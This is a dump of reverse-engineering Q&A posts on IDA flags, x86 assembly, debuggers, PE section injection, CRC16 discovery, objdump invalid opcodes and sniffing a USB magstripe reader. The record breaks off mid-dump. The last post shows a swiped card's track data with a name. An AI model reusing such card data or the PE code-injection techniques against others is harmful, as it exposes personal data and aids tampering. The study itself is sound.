"idapython - Determine if item is code or data","707","","<p>I need to determine whether an IDA's item is code or data.
Sometimes, data resides in an executable's code section (virtual functions tables, switch tables and stuff).
So in IDA, you can sometimes see this stuff in the code section:</p>

<pre><code>.text:100A1424     aInternetfreepr db 'InternetFreeProxyInfoList',0
.text:100A1424                                             ; DATA XREF: .text:10038688o
.text:100A143E                     align 10h
.text:100A1440     aInternetfreeco db 'InternetFreeCookies',0 ; DATA XREF: .text:10038680o
.text:100A1454     aInternetfortez db 'InternetFortezzaCommand',0
.text:100A1454                                             ; DATA XREF: .text:10038678o
</code></pre>

<p>is there a method I can call to defer between code and data using only the EA?</p>

<p>Thanks in advance.</p>
","<p>IDA utilizes flags for checking the properties of locations.</p>

<p>Looking at the <a href=""https://www.hex-rays.com/products/ida/support/idapython_docs/"" rel=""nofollow"">API</a> you can use getFlags(ea) and pass its output to isCode(flags) to check if a location is <em>flagged</em> cas being code.</p>

<p>edit:</p>

<p>you can find the exact definitions of the flags in IDC.IDC. A small excerpt:</p>

<pre><code>#define isCode(F)       ((F &amp; MS_CLS) == FF_CODE) // is code byte?
#define isData(F)       ((F &amp; MS_CLS) == FF_DATA) // is data byte?
#define isTail(F)       ((F &amp; MS_CLS) == FF_TAIL) // is tail byte?
#define isUnknown(F)    ((F &amp; MS_CLS) == FF_UNK)  // is unexplored byte?
#define isHead(F)       ((F &amp; FF_DATA) != 0)      // is start of code/data?
</code></pre>
","13450"
"Pintool For OSX","705","","<p>I see that PinTool works for Windows and Linux.  Does it also happen to work for OSX?  Or is there a similar tool that I can use to easily record code coverage for a closed-source app?</p>
","<p>Yes, pintool works on os x as well (Snow Leopard or newer for the current tech preview ver).</p>

<p><a href=""http://software.intel.com/en-us/articles/pintool-downloads"">http://software.intel.com/en-us/articles/pintool-downloads</a></p>
","1642"
"Understanding assembly Hello World","705","","<p>I'm studying x86 architecture and assembly in order to have the bases for studying reversing and exploit development. I'm following a course on opensecuritytraining.info. </p>

<p>I see a Hello World example:</p>

<pre><code>push ebp
mov ebp, esp
push offset aHelloWorld; ""Hello world\n""
call ds:__imp__printf
add esp, 4
mov eax, 1234h
pop ebp
retn
</code></pre>

<p>This code was generated by Windows Visual C++ 2005 with buffer overflow protection turned off and disassembled with IDA Pro 4.9 Free Version.</p>

<p>I'm trying to understand what each line does.</p>

<p>the first line is <code>push ebp</code>. </p>

<p>I know <code>ebp</code> stands for <strong>base pointer</strong>. What is its function? </p>

<p>I see that in the second line the value in <code>esp</code> is moved into <code>ebp</code> and searching online I see that there first 2 instructions are very common at the beginning of an assembly program. </p>

<p>Though are <code>ebp</code> and <code>esp</code> empty at the beginning? I'm new to assembly. Is <code>ebp</code> used for stack frames, so when we have a function in our code and is it optional for a simple program?</p>

<p>Then <code>push offset aHelloWorld; ""Hello world\n""</code></p>

<p>The part after <code>;</code> is a comment so it doesn't get executed right? The first part instead adds the address containing the string Hello World to the stack, right? But where is the string declared? I'm not sure I understand.</p>

<p>Then <code>call ds:__imp__printf</code></p>

<p>it seems it's a call to a function, anyway <code>printf</code> is a builtin function right?
And does <code>ds</code> stand for <strong>data segment register</strong>? Is it used because we are trying to access a memory operand that isn't on the stack?</p>

<p>then <code>add esp, 4</code></p>

<p>do we add 4 bytes to esp? Why?</p>

<p>then <code>move eax, 1234h</code>  what is 1234h here?</p>

<p>then <code>pop ebx</code>..it was pushed at the beginning. is it necessary to pop it at the end?</p>

<p>then <code>retn</code> ( i knew about <code>ret</code> for returning a value after calling a function). I read that the n in retn refers to the number of pushed arguments by the caller. It isn't very clear for me.
Can you help me to understand? </p>
","<p>first up: I would recommend you to try and write some simple assembly programs or use an intermediate representation like REIL to get a hang of it (REIL has only ~17 instructions).</p>

<pre><code>push ebp
mov ebp, esp
</code></pre>

<p>The first two lines build the <em>stack frame</em>. As you correctly mentioned, ebp describes the current stack frame. So when this function is called from another function, is saves the previous base pointer on the stack to be able to restore it when the function returns. When the value is saved, the function assignes the current location on the stack to be the new base pointer for this fuction.</p>

<p>This assignments are called function prolog and are common among different disassembleres. Mainly the ebp is used to reference function arguments, while the esp can be modified freely (by pushing variables on the stack, etc.)</p>

<pre><code>push offset aHelloWorld; ""Hello world\n"" 
</code></pre>

<p>This function pushes the <strong>address</strong> of the String ""Hello world\n"" on the stack. The comment at the end is just for convenience matters. Please note pushing something on the stack modifies esp by the (byte-size) of the given value. In this case 4 for x32 and 8 for x64 references (<code>esp=esp-4</code>).</p>

<pre><code>call ds:__imp__printf
</code></pre>

<p>This call does not directly jump to the function, because the function is loaded dynamically and the code does not know where the function is located in the address space. So it calls a reference to the location, which is the ""jump table"" or in this case rather ""import table"". When a binary is loaded, the systems loader ensures that it loads the dependencies and leaves the correct addresses for the program to use there. (<strong>imp</strong> stands for ""import"").</p>

<pre><code>add esp, 4
</code></pre>

<p>Based on the calling convention (how are arguments passed? who cleans them from the stack?) printf does not clean up its stack before returning. So the calling function must do it itself. It adds 4 to the stack pointer to revert the changes from the <code>push</code> instruction (which subtracted 4 from esp implicitly).</p>

<pre><code>mov eax, 1234h
</code></pre>

<p>Nothing special here. The value 0x1234 is <em>moved</em> to the register eax (apparently for no reason). I assume this is the return value of the program (unix convention is to return 0 in eax if there was no failure).</p>

<pre><code>pop ebp
</code></pre>

<p>This instruction reads the former value of ebp from the stack and stores it in ebp again. Please note you must keep track of the order in which things were pushed on the stack (Last-In-First-Out). Note that this instruction also adds 4 to the esp implicitly.</p>

<pre><code>retn
</code></pre>

<p>Resume execution at the location at the current esp. When a function is called, the calling fucntion pushes the address to return to on the stack. Also, this function adds 4 to esp to 'remove' the address from the stack.</p>
","13464"
"How to stop debugger right after the execution?","704","","<p>I'm using <code>/bin/true</code> as my sample binary (without available main method):</p>

<pre><code>$ lldb /bin/true
(lldb) target create ""/bin/true""
Current executable set to '/bin/true' (x86_64).
(lldb) break main
invalid command 'breakpoint main'
</code></pre>

<p>Is there any universal way to run the binary and stop the debugger right after the load, so appropriate symbols can be loaded? Something equivalent on breaking on the main method (first line of the code)? Or I need to calculate the entry point manually? If so, how?</p>
","<p>From <a href=""http://lldb.llvm.org/tutorial.html"" rel=""nofollow"">http://lldb.llvm.org/tutorial.html</a>:</p>

<pre><code>(lldb) process launch --stop-at-entry -- -program_arg value
</code></pre>

<p>Note your <code>break main</code> is a <code>gdb</code> command; <code>lldb</code>s error message isnt ""no such symbol"", it's ""invalid command"". To do the same in <code>lldb</code>, use</p>

<pre><code>(lldb) breakpoint set --name main
</code></pre>
","9585"
"Are there any free disassemblers for the NEC 78K0R family of processors?","703","","<p>Another slightly esoteric microcontroller in a product I'm looking at - the NEC 78K0R microcontroller. This is a 16-bit extension of the 78K0. The 78K0 can be disassembled in IDA Pro, but not the 78K0R.</p>

<p>Renesas Cubesuite allows viewing of disassembly of code compiled/assembled through it, as does IAR Workbench, but I can't see a way of loading a bin or hex file into these for disassembly.</p>

<p>KPIT GNU binutils has support for the RL78, which has a lot in common with the 78K0 instruction set, but is still very different.</p>

<p>Is there a free disassembler for these microcontrollers?</p>
","<p>Cubesuite+ can disassemble hex files.</p>

<p>1) Download and install <a href=""http://www.renesas.com/products/tools/ide/ide_cubesuite_plus/index.jsp"" rel=""nofollow noreferrer"">Cubesuite+ from Renesas</a>. V2.0.0 was used in this instance.</p>

<p>2) Start Cubesuite+</p>

<p>3) Go to Project -> Create New Project</p>

<p><img src=""https://i.stack.imgur.com/C6QLK.png"" alt=""Cubesuite+""></p>

<p>4) Change the Microcontroller to the correct one.</p>

<p>5) Change the Kind of Project to ""Debug Only"".</p>

<p><img src=""https://i.stack.imgur.com/E7qLx.png"" alt=""Project setup""></p>

<p>6) Once the project has been created, in the Project Tree, right click on Download files and go to Add</p>

<p>7) Find your hex or bin file and load it.</p>

<p><img src=""https://i.stack.imgur.com/HdQg2.png"" alt=""Add download file""></p>

<p>8) Go to Debug -> Build and Download</p>

<p>9) The 78K0R simulator starts and the disassembly is visible.</p>

<p>I have yet to work out how to denote instruction and data segments.</p>
","2377"
"How Can I Debug A Bios Better","703","","<p>I am trying to reverse engineer a firmkit in a bios, but in general I would like to know how can I debug a bios better.</p>

<p>I found a way to attach IDA to a vmware instance usign a GDB session <a href=""https://cyberview.wordpress.com/2010/09/16/debugging-bios-under-vmware-using-idas-gdb-debugger/"" rel=""nofollow"">GDB Debugging With VMware</a>, but it seems like I am always racing to against the bios and boot up of the VM. I am wanting to have it stop in a place that I can follow and make sense of.</p>

<p>In general, What are some better practices when debugging a bios? Is IDA a decent debugger for this task? Is there something more meant for this task? Any other ideas are welcome also, I am really wanting to focus on reversing malware that is written to the bios.</p>

<p>Thanks!</p>
","<p>You can try running your BIOS in QEMU. QEMU's <code>-S</code> option will pause boot until a debugger (gdb) is attached. IDA's debugger apparently works fine with QEMU, according to this article: <a href=""https://www.hex-rays.com/products/ida/support/tutorials/debugging_gdb_qemu.pdf"" rel=""nofollow"">https://www.hex-rays.com/products/ida/support/tutorials/debugging_gdb_qemu.pdf</a></p>
","11607"
"How to add code to Portable Executable?","703","","<p>I have a PE which I'd like to edit. I know I can create patches in OllyDbg and similar tools, but they all have one thing in common: I have to overwrite some present code in file. I wonder if it is possible to somehow enlarge the executable, put the code in the appended part, and then just change a few instructions in original part to <code>jmp</code> to the new part? I searched over the Internet, but I haven't found an obvious solution (well, some propose writing code in NOP sections, but my code i longer than the longest of them).</p>

<p>Note that the PE is 64-bit, so the solution must work for this architecture.</p>
","<p>Yes, you can add a new section to your PE file.</p>

<p>High-level instructions at <a href=""http://www.woodmann.com/fravia/covert1.htm"" rel=""nofollow"">Adding sections to PE Files</a> and low-level instructions at <a href=""http://www.codeproject.com/Articles/12532/Inject-your-code-to-a-Portable-Executable-file"" rel=""nofollow"">Inject your code to a Portable Executable file</a>.</p>
","9270"
"Chunked function (discontinuous chunks of code comprising a function)","701","","<p>The control flow graph below is from a single function in Notepad (Win7 64-bit). Why is the linker (or the compiler) separating the basic blocks of a single function into multiple, discontinuous chunks?</p>

<p><img src=""https://i.stack.imgur.com/GM19m.png"" alt=""Function CFG""> </p>
","<p>DCoder already referenced <a href=""https://reverseengineering.stackexchange.com/a/3169/245"">his own answer</a> in a comment.</p>

<p>The chunks in the control flow graph are usually referred to as basic blocks or extended basic blocks. The reason why they are being reordered has to with <a href=""http://en.wikipedia.org/w/index.php?title=Optimizing_compiler&amp;oldid=592712045#Other_optimizations"" rel=""nofollow noreferrer"">optimizations performed by the compiler</a>.</p>

<p>There are several terms for what you are asking about:</p>

<ul>
<li>function chunking</li>
<li>basic block reordering</li>
<li>partition interleaving</li>
</ul>

<p>I strongly suggest that if you are interested in this topic, you read up on compiler design. In particular I would suggest reading ""the dragon book"" (""Compilers - Principles, Techniques, &amp; Tools"" by Aho, Lam, Sethi and Ullman) and there the parts about optimization. Here I refer to the second edition from 2007 (ISBN: 0-321-48681-1).</p>

<p>Check out the sections 8.4 (""Basic Blocks and Flow Graphs"") and 8.5 (""Optimization of Basic Blocks"") and in the latter 8.5.7 (""Reassembling Basic Blocks From DAGs""). But that's only the beginning. Chapter 9 is equally important as a whole and so is section 11.10 (""Locality Optimizations""). Quoting one of the reasons for the kind of optimization you're asking about from the introductory paragraph of the subsection on partition interleaving:</p>

<blockquote>
  <h2>11.10.3 Partition Interleaving</h2>
  
  <p>Different partitions in a loop often read the same data, or read and write the same cache lines. [...]</p>
</blockquote>

<p>quoted from <strong>""Compilers - Principles, Techniques, &amp; Tools""</strong> by Aho, Lam, Sethi and Ullman.</p>

<p>This boils down to what DCoder has already mentioned in his/her comment to your question.</p>

<p>Oh and the book <strong>""Reversing: Secrets of Reverse Engineering""</strong> is also a good read that discusses this in part. However, it's more focused on the ""how does it look"" than the ""why is it done"".</p>
","3681"
"Finding out checksum algorithm","701","","<p>I have old serial communication protocol and having some trouble finding out about checksum algorithm that has been used. I've tried several CRC16 algorithms and none of them seem to work.</p>

<p>Tx message format looks like:</p>

<pre><code>start(10B) + messageIndex(1B) + data(5-15B) + checksum(2B) + end(1B) 
</code></pre>

<p>Rx message has same format but only 1 data byte. Here are few examples provided (hash # added to separate the blocks; hexadecimal format):</p>

<pre><code>Tx: 82 00 00 00 01 00 00 00 ff c1 # 48 # 56 57 50 41 54 5f 30 5f 31 3d 31 # 7f 12 # 83
Rx: 82 00 00 00 ff 00 00 00 01 01 # 48 # 4f # cc 68 # 83

Tx: 82 00 00 00 01 00 00 00 ff c1 # 49 # 56 57 50 41 4e 5f 30 5f 32 3d 49 55 30 30 30 # f5 16 # 83
Rx: 82 00 00 00 ff 00 00 00 01 01 # 49 # 4f # 5c 69 # 83

Tx: 82 00 00 00 01 00 00 00 ff c1 # 4a # 56 57 50 41 54 5f 30 5f 32 3d 31 # b8 1b # 83
Rx: 82 00 00 00 ff 00 00 00 01 01 # 4a # 4f # ac 69 # 83

Tx: 82 00 00 00 01 00 00 00 ff c1 # 4b # 56 57 41 4b 54 50 4e 5f 30 3d 32 # 60 6f # 83
Rx: 82 00 00 00 ff 00 00 00 01 01 # 4b # 4f # 3c 68 # 83

Tx: 82 00 00 00 01 00 00 00 ff c1 # 4c # 56 57 50 41 4e 5f 31 5f 31 3d 49 4c 30 30 30 # 6a ec # 83
Rx: 82 00 00 00 ff 00 00 00 01 01 # 4c # 4f # 0c 6a # 83
</code></pre>

<p>If necessary, I can provide more data. Any help or hint would be appreciated ;)</p>

<p>Best regards,
Zlatko</p>

<p><strong>EDIT</strong> The correct algorithm is regular CRC16 (0x8005 polynom). Thanks booto for correct answer.</p>
","<p>It's a <strong>big-endian CRC16</strong> (polynomial <code>0x8005</code>) of the data from the byte following the <code>0x82</code> up to and including the byte before the CRC.</p>

<p>For example, for your last RX frame:</p>

<pre><code>82 00 00 00 ff 00 00 00 01 01 4c 4f 0c 6a 83
</code></pre>

<p>The CRC16 of <code>{0x00,0x00,0x00,0xff,0x00,0x00,0x00,0x01,0x01,0x4c,0x4f}</code> is <code>0x0c6a</code>.</p>

<p>To find out this CRC algorithm, I assumed that <code>0x82</code> was a '<em>Start-of-Frame</em>' marker and <code>0x83</code> was an '<em>End-of-Frame</em>' marker. Then, I plugged the remaining data (sans crc field) into this on-line CRC calculation application and the emitted CRC16 looked correct. </p>

<p>I, then, checked a few of the other frames you supplied and verified the CRC calculation with other sources.</p>

<p>And, voila...</p>
","10614"
"Automatic function naming","699","","<p>I'ld like to know how to bulk rename functions in IDA, based on some condition.</p>

<p>Example:
Rename all functions to Foo_XYZ where the function accesses a certain static variable, for example : dword_12345.</p>

<p>This would help me a lot, because I know that address would be only accessed from functions that can be associated with some logic/functionality in the application.</p>
","<p>The IDAScope plugin has similar functionality to rename functions based on the Windows API functions they are calling. You can find a standalone script here that does that <a href=""http://hooked-on-mnemonics.blogspot.fr/2012/06/automated-generic-function-naming-in.html"">http://hooked-on-mnemonics.blogspot.fr/2012/06/automated-generic-function-naming-in.html</a> it should give you an idea how to implement what you are looking for.</p>
","3092"
"OllyDbg 2: Providing label arguments?","698","","<p>I recently switched from OllyDbg 1 to 2, and I'm really missing a feature the plugin ""LabelArgs"" provided to me in OllyDbg 1.</p>

<p>Labels were extended in a way it was possible to name the first instruction of an obvious functions like ""WriteToLog(int portOrOther, string title, string category, string text, int severity)"". In the disassembly, calls to the functions then appeared visually like calls to known WinAPI methods, for example:
<img src=""https://i.stack.imgur.com/jYRep.png"" alt=""enter image description here""></p>

<p>In OllyDbg 2 it looks like:
<img src=""https://i.stack.imgur.com/VDgLt.png"" alt=""enter image description here""></p>

<p>Sadly strings are not directly seen anymore, but it helped me much more seeing when pushes are about to be method parameters.</p>

<p>Is there an OllyDbg 2 compatible plugin providing me this feature?</p>
","<p>Since the original LabelArgs plugin was open source, I ported it to OllyDbg 2. It should have the same functionality as the original LabelArgs plugin, feel free to improve on it.</p>

<p>Link to the repository:
<a href=""https://bitbucket.org/mrexodia/labelargs"" rel=""nofollow"">https://bitbucket.org/mrexodia/labelargs</a></p>

<p>Binaries:
<a href=""https://bitbucket.org/mrexodia/labelargs/downloads"" rel=""nofollow"">https://bitbucket.org/mrexodia/labelargs/downloads</a></p>
","6616"
"(bad) opcodes of objdump","696","","<p>I'm trying to write my own disassembler for PE,PE+ and ELF executables but I'm stuck with a big problem on PE and PE+ executables.</p>

<p>I'm checking my work by comparing my output with objdump, and I found some (bad) opcodes appear in the disassembled program. I immediately checked the instruction manual to control these values; they are shown as invalid in instruction manual. Some examples:</p>

<p>Example from PE files:</p>

<pre><code>40dad1:       d6                      (bad)
</code></pre>

<p>Some other:</p>

<pre><code>402f1c:       ff                      (bad)
402f1d:       ff                      (bad)
402f1e:       ff                      (bad)
402f1f:       ff 01                   incl   (%ecx) #at last a valid instruction
</code></pre>

<p>These are valid when I check the manual, but I cannot understand this (it's a PE+ file, architecture is AMD64):</p>

<pre><code>f0 db a5 4e 9c 95 68    lock (bad) [rbp+0x68959c4e]

f0 is lock prefix
db means its a x87 instruction
a5 is ModRM byte(10 100 101) and by looking mod and reg fields we can say it's an invalid instruction
4e 9c 95 68 is used as 4byte disp but why ?
</code></pre>

<p>Do we assume that it's an invalid indirect x87 opcode and we continue to read as it's a valid opcode? I suppose objdump chooses this path.</p>

<p>And what are these (bad) instructions for? It's clear that they are not for aligning; or am I doing something wrong?</p>

<p>Btw, I'm trying to disassemble my old projects and FireFox to check if my program works. I'm using <code>objdump -z -d -M intel XXYYZZ.exe</code> to disassemble.</p>
","<p>You are correct, and <code>objdump</code> is actually wrong to disassemble such instruction, only to mark it as <code>(bad)</code> in a later stage.</p>

<p>Here is how it works:</p>

<pre><code>db a5 4e 9c 95 68    lock (bad) [rbp+0x68959c4e]
</code></pre>

<p><code>db</code> is one of the 87 FPU extensions, and <code>a5</code> indeed is the Mod/rm byte. Now, for the FPU extensions, the rm part is ""as usual"" for all other mod/rm instructions, but the mod part indicates which instruction to use, from this small table:</p>

<pre><code>DB /0     FILD mem4i
DB /2     FIST mem4i
DB /3     FISTP mem4i
DB /5     FLD mem10r
DB /7     FSTP mem10r
</code></pre>

<p>where the <code>/x</code> number indicates what got encoded in the mod part of the mod/rm byte (for completeness: <code>db eX</code> also forms some valid opcodes).</p>

<p>So of all available codes, those with the mod/rm patterns of <code>..001...</code>, <code>..100..</code> and <code>..110...</code> form 'bad' codes - but you only know this <em>after</em> parsing the mod/rm byte <em>and</em> checking this specific table for the opcode <code>DB</code>.</p>

<p>Now apparently objdump parses the entire instruction - including the 4-byte immediate value - <em>before</em> checking if the base instruction is valid to start with. I suppose it's just a table that says</p>

<pre><code>""fild"", ""(bad)"", ""fist"", ""fistp"", ""(bad)"", ""fld"", ""(bad)"", ""fstp""
</code></pre>

<p>and the <code>(bad)</code> entries get used as if they are actually valid.</p>

<p>One could argue that it's immaterial, because both ways lead to the conclusion the opcode is 'bad', but with objdump's method, you are not only discarding the first byte as 'bad' but an entire 6 bytes. It is at least <em>theoretically</em> possible the first byte (which causes the entire next sequence to be invalid) is data but followed <em>immediately</em> by correct code, which would then start with the sequence <code>a5 4e 9c 95 68</code> - which is skipped entirely by objdump.</p>

<blockquote>
  <p>.. what are these (bad) instructions for?</p>
</blockquote>

<p>I suppose, looking at the other instructions that you show, that you are disassembling a wrong part of the executable and this is not supposed to be code at all but data instead.</p>

<p>You should check the PE/PE++ headers to find the <em>sections</em>, and then only attempt disassembly on a section marked as ""code"" and/or ""executable"" in its <code>Characteristics</code> field. Even then, it's possible to start at a 'wrong' position (e.g., in the middle of a longer instruction) or inside data (which may also reside inside a <code>.code</code> section).</p>
","14036"
"Reverse engineering a USB magstripe card reader","695","","<p>I have a Magtek magstripe card reader. Here's more information than you'd ever want about the device:</p>

<pre><code># lsusb -v
Bus 001 Device 003: ID 0801:0001 MagTek Mini Swipe Reader (Keyboard Emulation)
Device Descriptor:
  bLength                18
  bDescriptorType         1
  bcdUSB               1.10
  bDeviceClass            0 (Defined at Interface level)
  bDeviceSubClass         0 
  bDeviceProtocol         0 
  bMaxPacketSize0        64
  idVendor           0x0801 MagTek
  idProduct          0x0001 Mini Swipe Reader (Keyboard Emulation)
  bcdDevice            1.00
  iManufacturer           1 (error)
  iProduct                2 (error)
  iSerial                 3 (error)
  bNumConfigurations      1
  Configuration Descriptor:
    bLength                 9
    bDescriptorType         2
    wTotalLength           34
    bNumInterfaces          1
    bConfigurationValue     1
    iConfiguration          0 
    bmAttributes         0x80
      (Bus Powered)
    MaxPower              100mA
    Interface Descriptor:
      bLength                 9
      bDescriptorType         4
      bInterfaceNumber        0
      bAlternateSetting       0
      bNumEndpoints           1
      bInterfaceClass         3 Human Interface Device
      bInterfaceSubClass      1 Boot Interface Subclass
      bInterfaceProtocol      1 Keyboard
      iInterface              0 
        HID Device Descriptor:
          bLength                 9
          bDescriptorType        33
          bcdHID               1.01
          bCountryCode            0 Not supported
          bNumDescriptors         1
          bDescriptorType        34 Report
          wDescriptorLength      76
         Report Descriptors: 
           ** UNAVAILABLE **
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x81  EP 1 IN
        bmAttributes            3
          Transfer Type            Interrupt
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0008  1x 8 bytes
        bInterval               1
Device Status:     0x0000
  (Bus Powered)
</code></pre>

<p>This is a USB keyboard emulation device, so when you swipe a card, the data on tracks 1 and 2 are typed on the screen into whatever program you have open at the time.</p>

<p>I'm trying to learn about USB reverse engineering, so I'm trying to understand how this device sends data to my computer. After swiping a card and seeing the data on the screen, I try to find that data in the USB requests that go back and forth between my computer and the device. To do this, I use <a href=""https://www.kernel.org/doc/Documentation/usb/usbmon.txt"" rel=""nofollow"">usbmon</a>:</p>

<pre><code># cat /sys/kernel/debug/usb/usbmon/1u
</code></pre>

<p>I've read up on the output of <code>usbmon</code> and I've also tried looking at the data using <a href=""http://vusb-analyzer.sourceforge.net/"" rel=""nofollow"">vusb-analyzer</a>, but I can't find any of the data I expect to see in the data stream.</p>

<p>Here is an example of the output on the screen and the output from <code>usbmon</code> after swiping an old (inactive) ID card from Oakland University.</p>

<p>Output on screen:</p>

<pre><code>%000127138,6361380000058657,SINGH,?;6361380000058657=123456789012?+000127138?
</code></pre>

<p>Usbmon Output:</p>

<pre><code>ffff88008954e900 3348888805 C Ii:1:003:1 0:1 8 = 02002200 00000000
ffff88008954e900 3348888878 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348889671 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348889709 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348890693 C Ii:1:003:1 0:1 8 = 00002700 00000000
ffff88008954e900 3348890719 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348892689 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348892712 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348893689 C Ii:1:003:1 0:1 8 = 00002700 00000000
ffff88008954e900 3348893714 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348894689 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348894714 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348895688 C Ii:1:003:1 0:1 8 = 00002700 00000000
ffff88008954e900 3348895713 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348896662 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348896686 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348897689 C Ii:1:003:1 0:1 8 = 00001e00 00000000
ffff88008954e900 3348897714 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348898690 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348898715 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348899686 C Ii:1:003:1 0:1 8 = 00001f00 00000000
ffff88008954e900 3348899709 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348900687 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348900710 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348901692 C Ii:1:003:1 0:1 8 = 00002400 00000000
ffff88008954e900 3348901716 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348902689 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348902710 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348903689 C Ii:1:003:1 0:1 8 = 00001e00 00000000
ffff88008954e900 3348903711 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348904691 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348904713 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348905692 C Ii:1:003:1 0:1 8 = 00002000 00000000
ffff88008954e900 3348905719 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348906665 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348906697 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348907696 C Ii:1:003:1 0:1 8 = 00002500 00000000
ffff88008954e900 3348907726 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348908687 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348908716 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348909688 C Ii:1:003:1 0:1 8 = 00003600 00000000
ffff88008954e900 3348909717 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348910688 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348910717 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348911688 C Ii:1:003:1 0:1 8 = 00002300 00000000
ffff88008954e900 3348911717 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348912687 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348912705 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348913687 C Ii:1:003:1 0:1 8 = 00002000 00000000
ffff88008954e900 3348913706 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348914688 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348914706 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348915686 C Ii:1:003:1 0:1 8 = 00002300 00000000
ffff88008954e900 3348915705 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348916688 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348916715 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348917691 C Ii:1:003:1 0:1 8 = 00001e00 00000000
ffff88008954e900 3348917718 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348918691 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348918717 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348919690 C Ii:1:003:1 0:1 8 = 00002000 00000000
ffff88008954e900 3348919717 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348920694 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348920718 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348921693 C Ii:1:003:1 0:1 8 = 00002500 00000000
ffff88008954e900 3348921716 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348922663 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348922679 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348923692 C Ii:1:003:1 0:1 8 = 00002700 00000000
ffff88008954e900 3348923721 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348924659 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348924678 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348925660 C Ii:1:003:1 0:1 8 = 00002700 00000000
ffff88008954e900 3348925675 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348926659 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348926674 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348927662 C Ii:1:003:1 0:1 8 = 00002700 00000000
ffff88008954e900 3348927680 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348928675 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348928701 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348929688 C Ii:1:003:1 0:1 8 = 00002700 00000000
ffff88008954e900 3348929714 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348930687 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348930713 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348931688 C Ii:1:003:1 0:1 8 = 00002700 00000000
ffff88008954e900 3348931715 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348932689 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348932720 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348933677 C Ii:1:003:1 0:1 8 = 00002200 00000000
ffff88008954e900 3348933690 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348934676 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348934687 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348935680 C Ii:1:003:1 0:1 8 = 00002500 00000000
ffff88008954e900 3348935692 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348936664 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348936675 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348937663 C Ii:1:003:1 0:1 8 = 00002300 00000000
